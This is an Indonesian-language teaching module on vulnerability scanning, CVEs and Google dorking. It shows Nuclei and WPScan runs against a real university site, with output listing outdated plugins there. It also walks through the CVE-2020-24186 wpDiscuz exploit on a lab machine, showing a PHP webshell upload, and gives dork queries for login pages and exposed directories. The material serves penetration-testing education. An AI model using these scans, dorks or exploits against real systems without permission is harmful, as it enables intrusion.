# Pengantar Vulnerability Scanning dan CVE

## Definisi Vulnerability Scanning
Vulnerability Scanning atau yang sering disebut Vulnerability Assessment merupakan kegiatan yang dilakukan dalam penetration testing untuk melakukan identifikasi kerentanan pada suatu sistem secara otomatis dengan menggunakan tool atau software tambahan.

Vulnerability Scanning cenderung memanfaatkan tool yang sudah ada sehingga tidak menutup kemungkinan akan terjadi **false positive**. Agar hal tersebut tidak terjadi, peran sebagai seorang pentester akan sangat dibutuhkan untuk melakukan validasi pada hasil vulnerability scanning.

### Metode Vulnerability Scanning
| Nama Metode | Deskripsi |
| :--: | :-- |
| Static Application Security Testing (SAST) | Metode pengujian sistem secara whitebox dengan memeriksa kode pada aplikasi atau sistem untuk menemukan kerentanan. |
| Dynamic Application Security Testing (DAST) | Metode pengujian sistem secara blackbox dengan memeriksa aplikasi atau sistem saat sedang berjalan untuk menemukan kerentanan yang bisa diserang oleh attacker. |

## **&#9888;** Sebelum Lanjut Membaca .... 
Segala bentuk kegiatan **Vulnerability Scanning** atau **Vulnerability Assessment** tanpa ada persetujuan dan izin dari pemilik sistem/aplikasi merupakan **illegal**.

Materi yang dipaparkan dalam modul ini untuk keperluan edukasi/pembelajaran, sehingga tidak membenarkan segala aktivitas **illegal**.

## Alat untuk Vulnerability Scanning
Terdapat beberapa macam - macam alat untuk melakukan **Vulnerability Scanning** atau **Vulnerability Assessment**. Dimulai dari yang berbasis open-source maupun berbayar untuk keperluan bisnis dan perusahaan.

| Logo | Nama Alat | Platform | Lisensi |
| :--: | :-- | :--: | :-- |
| ![acunetix](https://cyber-security.ae/wp-content/uploads/acunetix.png) | Acunetix | Windows, Linux, MacOS | Komersial (Gratis, fitur yang terbatas) |
| ![nessus](https://cdn.dribbble.com/users/238042/screenshots/1014644/media/54c5ae6c6749bbbf0cef511cf03d842c.png) | Nessus | Windows, Linux, MacOS | Komersial (Gratis, fitur yang terbatas) |
| ![nuclei](https://miro.medium.com/v2/resize:fit:996/1*U5MxN6VKGkqL_RbHaUC5tg.png) | Nuclei | Windows, Linux, MacOS | Open-source |
| ![nikto](https://media.licdn.com/dms/image/D5612AQHT6Q40l4hOvQ/article-cover_image-shrink_600_2000/0/1706223721511?e=2147483647&v=beta&t=Yc1OhYbhOM-hsZGteoWfyw-lxC3EnwP31sqo-fJikGA) | Nikto | Linux | Open-source |
| ![wpscan](https://raw.githubusercontent.com/wpscanteam/wpscan/gh-pages/images/wpscan_logo.png) | WPScan | Windows, Linux, MacOS | Komersial/Gratis |

### Contoh Penggunaan
Berikut adalah contoh penggunaan Nuclei.

```sh
# Menampilkan opsi yang terdapat pada nuclei.

┌──(ery㉿ery)-[~]
└─$ nuclei -h
```

```sh
# Melakukan scanning single target

┌──(ery㉿ery)-[~]
└─$ nuclei -u its.ac.id -o its.txt

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.2.4

                projectdiscovery.io

[INF] nuclei-templates are not installed, installing...
[INF] Successfully installed nuclei-templates at /home/ery/.local/nuclei-templates
[INF] Current nuclei version: v3.2.4 (latest)
[INF] Current nuclei-templates version: v9.8.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 77
[INF] Templates loaded for current scan: 7841
[INF] Executing 7841 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
[INF] Templates clustered: 1459 (Reduced 1420 Requests)
```

Berikut adalah contoh penggunaan WPScan.

```sh
# Menampilkan opsi pada WPScan

┌──(ery㉿ery)-[~]
└─$ wpscan --h
```

```sh
# Update database pada WPScan

┌──(ery㉿ery)-[~]
└─$ wpscan --update                
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.
```

```sh
# Melakukan scanning dengan single target

┌──(ery㉿ery)-[~]
└─$ wpscan --url https://www.its.ac.id/informatika/       
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://www.its.ac.id/informatika/ [103.94.189.5]
[+] Started: Mon Apr 15 14:51:38 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.3
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://www.its.ac.id/informatika/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: https://www.its.ac.id/informatika/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.3 identified (Insecure, released on 2023-08-08).
 | Found By: Rss Generator (Passive Detection)
 |  - https://www.its.ac.id/informatika/feed/, <generator>https://wordpress.org/?v=6.3</generator>
 | Confirmed By: Emoji Settings (Passive Detection)
 |  - https://www.its.ac.id/informatika/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.3'

[+] WordPress theme in use: DepartmentITS
 | Location: https://www.its.ac.id/informatika/wp-content/themes/DepartmentITS/
 | Readme: https://www.its.ac.id/informatika/wp-content/themes/DepartmentITS/README.md
 | Style URL: https://www.its.ac.id/informatika/wp-content/themes/DepartmentITS/style.css
 | Style Name: ITS Department Portal Website
 | Description: ITS Department university portal website...
 | Author: dot indonesia
 | Author URI: http://dot.co.id
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/themes/DepartmentITS/style.css, Match: 'Version: 1.0.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] bj-lazy-load
 | Location: https://www.its.ac.id/informatika/wp-content/plugins/bj-lazy-load/
 | Latest Version: 1.0.9 (up to date)
 | Last Updated: 2017-08-09T12:06:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0.9 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/plugins/bj-lazy-load/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/plugins/bj-lazy-load/readme.txt

[+] js_composer
 | Location: https://www.its.ac.id/informatika/wp-content/plugins/js_composer/
 | Last Updated: 2024-04-11T11:00:21.000Z
 | [!] The version is out of date, the latest version is 7.6
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Meta Generator (Passive Detection)
 |  Body Tag (Passive Detection)
 |
 | Version: 5.1.1 (80% confidence)
 | Found By: Body Tag (Passive Detection)
 |  - https://www.its.ac.id/informatika/, Match: 'js-comp-ver-5.1.1'
 | Confirmed By: Query Parameter (Passive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/plugins/js_composer/assets/css/js_composer.min.css?ver=5.1.1
 |  - https://www.its.ac.id/informatika/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js?ver=5.1.1

[+] multisite-global-search
 | Location: https://www.its.ac.id/informatika/wp-content/plugins/multisite-global-search/
 | Latest Version: 1.2.14 (up to date)
 | Last Updated: 2017-02-12T23:30:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.2.14 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/plugins/multisite-global-search/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/plugins/multisite-global-search/readme.txt

[+] post-views-counter
 | Location: https://www.its.ac.id/informatika/wp-content/plugins/post-views-counter/
 | Last Updated: 2024-03-20T18:58:00.000Z
 | [!] The version is out of date, the latest version is 1.4.5
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.3.13 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/plugins/post-views-counter/readme.txt

[+] tablepress
 | Location: https://www.its.ac.id/informatika/wp-content/plugins/tablepress/
 | Last Updated: 2024-04-02T08:17:00.000Z
 | [!] The version is out of date, the latest version is 2.3
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 2.1.7 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/plugins/tablepress/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/plugins/tablepress/readme.txt

[+] wordpress-seo
 | Location: https://www.its.ac.id/informatika/wp-content/plugins/wordpress-seo/
 | Last Updated: 2024-04-03T08:01:00.000Z
 | [!] The version is out of date, the latest version is 22.4
 |
 | Found By: Comment (Passive Detection)
 |
 | Version: 20.13 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - https://www.its.ac.id/informatika/, Match: 'optimized with the Yoast SEO plugin v20.13 -'
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - https://www.its.ac.id/informatika/wp-content/plugins/wordpress-seo/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - https://www.its.ac.id/informatika/wp-content/plugins/wordpress-seo/readme.txt

[+] wp-pagenavi
 | Location: https://www.its.ac.id/informatika/wp-content/plugins/wp-pagenavi/
 | Latest Version: 2.94.1 (up to date)
 | Last Updated: 2023-08-09T02:53:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 2.94.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/plugins/wp-pagenavi/readme.txt

[+] wp-statistics
 | Location: https://www.its.ac.id/informatika/wp-content/plugins/wp-statistics/
 | Last Updated: 2024-04-13T13:20:00.000Z
 | [!] The version is out of date, the latest version is 14.6.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 14.1.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/plugins/wp-statistics/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://www.its.ac.id/informatika/wp-content/plugins/wp-statistics/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:37 <===================================================> (137 / 137) 100.00% Time: 00:00:37

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Apr 15 14:52:51 2024
[+] Requests Done: 193
[+] Cached Requests: 6
[+] Data Sent: 56.291 KB
[+] Data Received: 756.681 KB
[+] Memory used: 264.637 MB
[+] Elapsed time: 00:01:12
```

## Definisi CVE (Common Vulnerabilities and Exposures)
CVE atau yang sering disebut sebagai Common Vulnerabilities and Exposures merupakan daftar keamanan informasi pada suatu software atau firmware yang rentan dan berpotensi adanya serangan siber.

CVE biasanya akan dicatat dalam bentuk berikut:
- Nama dari kerentanan akan menggunakan format CVE-[TAHUN]-[NOMOR]
- Deskripsi dari kerentanan, contoh `Directory Traversal to Unauthenticated Arbitrary File Deletion`

### Exploitasi CVE
Terdapat banyak metode untuk melakukan exploitasi sebuah CVE, dimulai dengan menggunakan tool tambahan seperti `Metasploit` atau dilakukan secara manual oleh seorang pentester.

Berikut adalah contoh exploitasi pada **CVE-2020-24186: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)**.

1. Melakukan reconnaissance pada target.

    Pada plugin wordpress kita bisa mengetahui versi yang digunakan pada website tersebut, dengan menambahkan `readme.txt` atau `README.txt`
    ```
    === Comments - wpDiscuz ===
    Contributors: gVectors Team
    Tags: comment, comments, ajax comments, comment form, comment fields
    Requires at least: 5.0
    Tested up to: 5.4
    Stable tag: 7.0.4
    Requires PHP: 5.4 and higher
    License: GPLv3
    License URI: https://www.gnu.org/licenses/gpl-3.0.html
    ```

2. Mencari kerentanan yang berkaitan dengan versi produk
    
    Dapat diketahui plugin tersebut memiliki versi `7.0.4` yang dimana apabila kita melakukan pencarian lebih lanjut akan diketahui kerentanan yang dimiliki plugin tersebut.

    Kita mendapatkan `CVE-2020-24186` yang dimana plugins wpDiscuz rentan terhadap Remote Code Execution di versi tersebut.

3. Melakukan exploitasi

    Kita dapat melakukan exploitasi secara manual dengan PoC publik yang telah ada, atau menggunakan script yang sudah ada untuk mempermudah exploitasi.

    [Exploit CVE-2020-24186](https://www.exploit-db.com/exploits/49967)

    ```sh
    ──(ery㉿ery)-[~/Learning/Hacktrace/Machine/Artemis]
    └─$ python3 exp.py -u http://artemis.ht/wordpress/ -p /index.php/2023/12/19/hello-world/
    ---------------------------------------------------------------
    [-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
    [-] File Upload Bypass Vulnerability - PHP Webshell Upload
    [-] CVE: CVE-2020-24186
    [-] https://github.com/hevox
    --------------------------------------------------------------- 

    [+] Response length:[96821] | code:[200]
    [!] Got wmuSecurity value: ba4b29aed3
    [!] Got wmuSecurity value: 1 

    [+] Generating random name for Webshell...
    [!] Generated webshell name: rfhtdtkithjfnkq

    [!] Trying to Upload Webshell..
    [+] Upload Success... Webshell path:url&quot;:&quot;http://10.1.2.151/wordpress/wp-content/uploads/2024/04/rfhtdtkithjfnkq-1713193721.8989.php&quot;
    ```

Dengan begitu seorang pentester bisa melakukan exploitasi pada CVE yang sudah ada dengan script maupun PoC (Proof of Concept) yang sudah tersebar di publik.

## Google-Fu
**Google-Fu** atau yang sering disebut sebagai **Google Dorking** merupakan sebuah metode yang digunakan oleh penyerang untuk memperoleh informasi sensitif tentang kerentanan pada aplikasi/sistem yang diindeks oleh Google.

### Google Search Operator
| Operator | Deskripsi |
| :--: | :-- |
| intitle | Mencari keyword berdasarkan judul halaman. |
| intext | Mencari keyword berdasarkan isi konten halaman. |
| filetype / ext | Mencari file berdasarkan extension tertentu. |
| site | Membatasi pencarian ke website tertentu. |
| inurl | Mencari keyword dalam url halaman. |

Contoh penggunaan **Google Dorking**:
```
# Mencari file spesifik seperti pdf atau excel
filetype:pdf site:its.ac.id
filetype:xlsx site:its.ac.id

# Mencari login page pada suatu website
inurl:login site:its.ac.id
intitle:login site:its.ac.id

# Mencari direktori yang terekspos
intitle:"Index of" site:its.ac.id
```

## Referensi
- CompTIA PenTest+ Student Guide (PT0-002)
- [OWASP Vulnerability Scanning Tools](https://owasp.org/www-community/Vulnerability_Scanning_Tools)
- [Google Dorking Cheatsheet](https://www.tutorialsfreak.com/ethical-hacking-tutorial/google-dorking-cheat-sheet)